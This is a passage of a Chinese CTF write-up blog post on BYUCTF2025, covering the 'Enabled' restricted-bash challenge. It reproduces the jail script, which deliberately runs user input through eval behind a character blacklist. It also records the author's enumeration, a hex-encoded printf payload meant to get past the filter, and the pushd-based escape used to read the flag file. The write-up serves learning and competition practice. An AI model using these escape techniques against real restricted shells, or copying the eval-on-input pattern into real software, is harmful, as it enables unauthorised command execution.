<p>直接冲了<code>byuctf&#123;172.16.0.10,172.16.0.5&#125;</code></p>
<h2 id="Enabled"><a href="#Enabled" class="headerlink" title="Enabled"></a>Enabled</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">unset</span> PATH</span><br><span class="line"><span class="built_in">enable</span> -n <span class="built_in">exec</span></span><br><span class="line"><span class="built_in">enable</span> -n <span class="built_in">command</span></span><br><span class="line"><span class="built_in">enable</span> -n <span class="built_in">type</span></span><br><span class="line"><span class="built_in">enable</span> -n <span class="built_in">hash</span></span><br><span class="line"><span class="built_in">enable</span> -n <span class="built_in">cd</span></span><br><span class="line"><span class="built_in">enable</span> -n <span class="built_in">enable</span></span><br><span class="line"><span class="built_in">set</span> +x</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Welcome to my new bash, sbash, the Safe Bourne Again Shell! There&#x27;s no exploiting this system&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">read</span> -p <span class="string">&quot;safe_bash&gt; &quot;</span> user_input</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Check if input is empty</span></span><br><span class="line">    [[ -z <span class="string">&quot;<span class="variable">$user_input</span>&quot;</span> ]] &amp;&amp; <span class="built_in">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;<span class="variable">$user_input</span>&quot;</span> <span class="keyword">in</span> </span><br><span class="line">        *<span class="string">&quot;&gt;&quot;</span>*|*<span class="string">&quot;&lt;&quot;</span>*|*<span class="string">&quot;/&quot;</span>*|*<span class="string">&quot;;&quot;</span>*|*<span class="string">&quot;&amp;&quot;</span>*|*<span class="string">&quot;$&quot;</span>*|*<span class="string">&quot;(&quot;</span>*|*<span class="string">&quot;\`&quot;</span>*) <span class="built_in">echo</span> <span class="string">&quot;No special characters, those are unsafe!&quot;</span> &amp;&amp; <span class="built_in">continue</span>;;</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Execute only if it&#x27;s a Bash builtin</span></span><br><span class="line">    <span class="built_in">eval</span> <span class="string">&quot;<span class="variable">$user_input</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>禁用了一部分关键词<code>&gt;|&lt;|/|;|&amp;|$|(|</code>以及反引号，执行<code>pwd</code>得知在<code>/app</code>，并且发现当前目录还有一个<code>run</code>，没有什么发现，利用<code>compgen -c</code>列出所有当前可以使用的命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">baozongw1@ubuntu:~/Desktop/MiscTools$ nc enabled.chal.cyberjousting.com 1352</span><br><span class="line">Welcome to my new bash, sbash, the Safe Bourne Again Shell! There&#x27;s no exploiting this system</span><br><span class="line">compgen -c</span><br><span class="line">if</span><br><span class="line">then</span><br><span class="line">else</span><br><span class="line">elif</span><br><span class="line">fi</span><br><span class="line">case</span><br><span class="line">esac</span><br><span class="line">for</span><br><span class="line">select</span><br><span class="line">while</span><br><span class="line">until</span><br><span class="line">do</span><br><span class="line">done</span><br><span class="line">in</span><br><span class="line">function</span><br><span class="line">time</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">!</span><br><span class="line">[[</span><br><span class="line">]]</span><br><span class="line">coproc</span><br><span class="line">.</span><br><span class="line">:</span><br><span class="line">[</span><br><span class="line">alias</span><br><span class="line">bg</span><br><span class="line">bind</span><br><span class="line">break</span><br><span class="line">builtin</span><br><span class="line">caller</span><br><span class="line">compgen</span><br><span class="line">complete</span><br><span class="line">compopt</span><br><span class="line">continue</span><br><span class="line">declare</span><br><span class="line">dirs</span><br><span class="line">disown</span><br><span class="line">echo</span><br><span class="line">eval</span><br><span class="line">exit</span><br><span class="line">export</span><br><span class="line">false</span><br><span class="line">fc</span><br><span class="line">fg</span><br><span class="line">getopts</span><br><span class="line">help</span><br><span class="line">history</span><br><span class="line">jobs</span><br><span class="line">kill</span><br><span class="line">let</span><br><span class="line">local</span><br><span class="line">logout</span><br><span class="line">mapfile</span><br><span class="line">popd</span><br><span class="line">printf</span><br><span class="line">pushd</span><br><span class="line">pwd</span><br><span class="line">read</span><br><span class="line">readarray</span><br><span class="line">readonly</span><br><span class="line">return</span><br><span class="line">set</span><br><span class="line">shift</span><br><span class="line">shopt</span><br><span class="line">source</span><br><span class="line">suspend</span><br><span class="line">test</span><br><span class="line">times</span><br><span class="line">trap</span><br><span class="line">true</span><br><span class="line">typeset</span><br><span class="line">ulimit</span><br><span class="line">umask</span><br><span class="line">unalias</span><br><span class="line">unset</span><br><span class="line">wait</span><br></pre></td></tr></table></figure>

<p>先利用<code>declare -p</code>找下环境变量，发现没有flag，运行了一下<code>help</code>得知了这些</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">GNU bash, version 5.2.21(1)-release (x86_64-pc-linux-gnu)</span><br><span class="line">These shell commands are defined internally.  Type `help&#x27; to see this list.</span><br><span class="line">Type `help name&#x27; to find out more about the function `name&#x27;.</span><br><span class="line">Use `info bash&#x27; to find out more about the shell in general.</span><br><span class="line">Use `man -k&#x27; or `info&#x27; to find out more about commands not in this list.</span><br><span class="line"></span><br><span class="line">A star (*) next to a name means that the command is disabled.</span><br><span class="line"></span><br><span class="line"> job_spec [&amp;]                            history [-c] [-d offset] [n] or hist&gt;</span><br><span class="line"> (( expression ))                        if COMMANDS; then COMMANDS; [ elif C&gt;</span><br><span class="line"> . filename [arguments]                  jobs [-lnprs] [jobspec ...] or jobs &gt;</span><br><span class="line"> :                                       kill [-s sigspec | -n signum | -sigs&gt;</span><br><span class="line"> [ arg... ]                              let arg [arg ...]</span><br><span class="line"> [[ expression ]]                        local [option] name[=value] ...</span><br><span class="line"> alias [-p] [name[=value] ... ]          logout [n]</span><br><span class="line"> bg [job_spec ...]                       mapfile [-d delim] [-n count] [-O or&gt;</span><br><span class="line"> bind [-lpsvPSVX] [-m keymap] [-f file&gt;  popd [-n] [+N | -N]</span><br><span class="line"> break [n]                               printf [-v var] format [arguments]</span><br><span class="line"> builtin [shell-builtin [arg ...]]       pushd [-n] [+N | -N | dir]</span><br><span class="line"> caller [expr]                           pwd [-LP]</span><br><span class="line"> case WORD in [PATTERN [| PATTERN]...)&gt;  read [-ers] [-a array] [-d delim] [-&gt;</span><br><span class="line">*cd [-L|[-P [-e]] [-@]] [dir]            readarray [-d delim] [-n count] [-O &gt;</span><br><span class="line">*command [-pVv] command [arg ...]        readonly [-aAf] [name[=value] ...] o&gt;</span><br><span class="line"> compgen [-abcdefgjksuv] [-o option] [&gt;  return [n]</span><br><span class="line"> complete [-abcdefgjksuv] [-pr] [-DEI]&gt;  select NAME [in WORDS ... ;] do COMM&gt;</span><br><span class="line"> compopt [-o|+o option] [-DEI] [name .&gt;  set [-abefhkmnptuvxBCEHPT] [-o optio&gt;</span><br><span class="line"> continue [n]                            shift [n]</span><br><span class="line"> coproc [NAME] command [redirections]    shopt [-pqsu] [-o] [optname ...]</span><br><span class="line"> declare [-aAfFgiIlnrtux] [name[=value&gt;  source filename [arguments]</span><br><span class="line"> dirs [-clpv] [+N] [-N]                  suspend [-f]</span><br><span class="line"> disown [-h] [-ar] [jobspec ... | pid &gt;  test [expr]</span><br><span class="line"> echo [-neE] [arg ...]                   time [-p] pipeline</span><br><span class="line">*enable [-a] [-dnps] [-f filename] [na&gt;  times</span><br><span class="line"> eval [arg ...]                          trap [-lp] [[arg] signal_spec ...]</span><br><span class="line">*exec [-cl] [-a name] [command [argume&gt;  true</span><br><span class="line"> exit [n]                               *type [-afptP] name [name ...]</span><br><span class="line"> export [-fn] [name[=value] ...] or ex&gt;  typeset [-aAfFgiIlnrtux] name[=value&gt;</span><br><span class="line"> false                                   ulimit [-SHabcdefiklmnpqrstuvxPRT] [&gt;</span><br><span class="line"> fc [-e ename] [-lnr] [first] [last] o&gt;  umask [-p] [-S] [mode]</span><br><span class="line"> fg [job_spec]                           unalias [-a] name [name ...]</span><br><span class="line"> for NAME [in WORDS ... ] ; do COMMAND&gt;  unset [-f] [-v] [-n] [name ...]</span><br><span class="line"> for (( exp1; exp2; exp3 )); do COMMAN&gt;  until COMMANDS; do COMMANDS-2; done</span><br><span class="line"> function name &#123; COMMANDS ; &#125; or name &gt;  variables - Names and meanings of so&gt;</span><br><span class="line"> getopts optstring name [arg ...]        wait [-fn] [-p var] [id ...]</span><br><span class="line">*hash [-lr] [-p pathname] [-dt] [name &gt;  while COMMANDS; do COMMANDS-2; done</span><br><span class="line"> help [-dms] [pattern ...]               &#123; COMMANDS ; &#125;</span><br></pre></td></tr></table></figure>

<p>那么我们可以使用<code>printf</code>来打印<code>/</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">printf &quot;\\x2f&quot;</span><br><span class="line">builtin printf &quot;\\x2e\\x2e\\x2fbin&quot;</span><br><span class="line"></span><br><span class="line">&#123;printf,&quot;\x73\x6f\x75\x72\x63\x65\x20\x2f\x66\x6c\x61\x67&quot;&#125;|bash</span><br></pre></td></tr></table></figure>

<p>没能做出来，后面去问的discord的师傅，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pushd ..</span><br><span class="line">pushd bin</span><br><span class="line">bash</span><br><span class="line">cd /flag</span><br><span class="line">cat flag.txt</span><br></pre></td></tr></table></figure>

<p>先利用<code>pushd</code>切换目录，然后进入<code>/bin</code>之后去开启新的bash会话</p>
<p>或者是不开启bash会话，其中比较重要的就是<strong>如何切换目录</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pushd ..</span><br><span class="line">echo *</span><br><span class="line">pushd flag</span><br><span class="line">source flag.txt</span><br></pre></td></tr></table></figure>

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>挺好的比赛，每题都让我学到一些东西，密码的两题除外，AI做的，哈哈</p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button>
    Donate
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechat.png" alt="baozongwi reward">
        <span>reward</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>baozongwi
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://baozongwi.xyz/posts/4a377860.html" title="BYUCTF2025">https://baozongwi.xyz/posts/4a377860.html</a>
  </li>
  <li class="post-copyright-license">
      <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/xss/" rel="tag"># xss</a>
              <a href="/tags/jail/" rel="tag"># jail</a>
              <a href="/tags/jwt/" rel="tag"># jwt</a>
              <a href="/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/" rel="tag"># 日志分析</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/posts/ab1ee75b.html" rel="prev" title="ISCC2025国赛">
                  <i class="fa fa-angle-left"></i> ISCC2025国赛
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/posts/1ce177a3.html" rel="next" title="京麒CTF2025热身赛">
                  京麒CTF2025热身赛 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2024 – 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">baozongwi</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="Word count total">3.1m</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">87:21</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
